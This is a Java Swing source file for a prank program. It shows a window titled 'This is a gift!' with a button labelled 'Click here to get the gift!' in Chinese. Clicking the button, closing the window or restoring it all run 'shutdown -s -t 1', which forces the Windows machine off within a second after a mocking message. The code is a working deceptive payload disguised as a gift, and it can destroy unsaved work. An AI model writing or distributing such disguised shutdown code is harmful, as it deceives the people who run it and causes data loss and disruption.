package com.iam57.shutdown;

import javax.swing.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;

public class MainUI extends JFrame {
    public MainUI() {
        init();
        clickToShutdown();
        setVisible(true);
    }

    private void init() {
        setTitle("这是一个礼物！");
        setSize(300, 100);
        setResizable(false);
        setLocationRelativeTo(null);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                shutdown();
            }

            @Override
            public void windowClosed(WindowEvent e) {
                shutdown();
            }

            @Override
            public void windowDeiconified(WindowEvent e) {
                shutdown();
            }
        });
    }

    private void clickToShutdown() {
        JButton jbt = new JButton("点击这里获取礼物！");
        add(jbt);
        jbt.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                shutdown();
            }
        });
    }

    private void shutdown() {
        JOptionPane.showMessageDialog(null, "您辛苦了，帮您关机凉快一下捏！");
        try {
            Runtime.getRuntime().exec("shutdown -s -t 1");
        } catch (IOException ex) {
            throw new RuntimeException(ex);
        }
    }
}
